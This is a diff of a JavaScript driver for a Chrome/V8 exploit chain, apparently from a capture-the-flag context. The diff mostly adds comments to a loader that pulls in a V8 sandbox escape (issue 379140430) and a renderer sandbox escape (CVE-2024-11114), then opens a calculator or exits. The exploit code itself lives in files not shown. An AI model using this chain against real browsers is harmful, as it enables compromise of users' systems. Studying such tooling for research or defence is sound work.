@@ -2,6 +2,7 @@
 let loglevel = 2;
 let run_in_worker = false;
 
+
 // Exploit chain
 let main = async () => {
     log("[i] Current log level: " + loglevel);
@@ -14,6 +15,7 @@ let main = async () => {
     await include("kit/common/versions.js");
     await include("kit/common/wasm-module-builder.js");
 
+    // Symbols for the exploit chain
     await include("vulns/symbols.js");
 
     await include("kit/fingerprint/d8.js");
@@ -24,7 +26,7 @@ let main = async () => {
 
     await include("kit/v8/cage.js");
 
-    // V8 sandbox escape: issue 379140430
+    // V8 sandbox escape: issue 379140430 (+ leak a pointer to the trusted cage)
     await include("vulns/v8sbx/379140430.js");
 
     await include("kit/v8/memory.js");
@@ -42,23 +44,36 @@ let main = async () => {
     await include("kit/fingerprint/win.js");
     await include("kit/fingerprint/linux.js");
 
-    // Custom payload: find flag path
+    // MojoJS is not required for this exploit chain
+    /* await include("kit/renderer/mojo.js"); */
+
+    // If the sandbox is disabled, open a calculator
+    // Else, sandbox escape: CVE-2024-11114
     await include("vulns/path_finder.js");
+    // Sandbox escape not needed for Linux
 }
 
+
+// Logging
 function log(msg, level=0) {
     if (level <= loglevel) {
         console.log("\t".repeat((level >= 0) ? level : 0) + msg);
     }
 }
 
+
+// Load a script & run it in the global scope or in a dedicated Web Worker
+// Script's completion value may be a Promise which will be awaited
+// Require read() to be implemented
 let include, worker, worker_eval;
 var [RETRY, RELOAD, clean] = [0, false, () => {}];
 {
+    // Evaluate scripts in the global scope
     let evaluate = async (script) => {
         await eval?.(script);
     }
 
+    // Setup a Web Worker & evaluate scripts within it
     let worker_code = () => {
         [RETRY, RELOAD, clean] = [0, false, () => {}];
         log = (msg, level=0) => postMessage({"type": "log", "msg": msg, "level": level});
@@ -74,7 +89,7 @@ var [RETRY, RELOAD, clean] = [0, false, () => {}];
     }
     let worker_code_str = `(${worker_code})();`;
 
-    if (typeof Blob === "undefined") {
+    if (typeof Blob === "undefined") {  // d8 does not support Blob but allow "string" type
         worker = new Worker(worker_code_str, {type: "string"});
     } else {
         let blob = new Blob([worker_code_str], {type: "application/javascript"});
@@ -103,9 +118,10 @@ var [RETRY, RELOAD, clean] = [0, false, () => {}];
         });
     }
 
+    // Run/retry included scripts
     let run = async (script, trycount=1) => {
-        [RETRY, RELOAD] = [0, false];
-        script = `/*${Date.now()}*/` + script;
+        [RETRY, RELOAD] = [0, false];           // reset RETRY & RELOAD to defaults for the new script
+        script = `/*${Date.now()}*/` + script;  // timestamp to prevent caching issues
 
         try {
             if (run_in_worker && typeof worker !== "undefined") await worker_eval(script);
@@ -124,11 +140,12 @@ var [RETRY, RELOAD, clean] = [0, false, () => {}];
         }
     }
 
+    // Load a script
     let code = "";
     include = async (path, run_now=true) => {
         code += `log("[i] Loading ${path}", 0);`
                 + await read(path)
-                + ((run_now && !code) ? `//# sourceURL=${path}` : "");
+                + ((run_now && !code) ? `//# sourceURL=${path}` : "");  // automatic sourcemaps if available
         if (run_now) {
             await run(code);
             code = "";
@@ -136,6 +153,9 @@ var [RETRY, RELOAD, clean] = [0, false, () => {}];
     }
 }
 
+
+// Exit after the exploit completes
+// Or reload to try the exploit again
 let exit = async () => {
     await clean();
     if (typeof worker !== "undefined") {
@@ -146,10 +166,14 @@ let exit = async () => {
     if (RELOAD) {
         log("[i] Reloading the exploit");
         if (typeof(window) !== "undefined") { window.location.reload(); }
-    } else {
+    }
+
+    else {
         log("[i] Exploit chain done, exit cleanly");
         if (typeof(window) !== "undefined") { window.location.replace("https://0.0.0.0:0/"); }
     }
 }
 
+
+// Run the exploit chain
 main().catch((err) => log(err.message ? err.message : err, -1)).finally(exit);
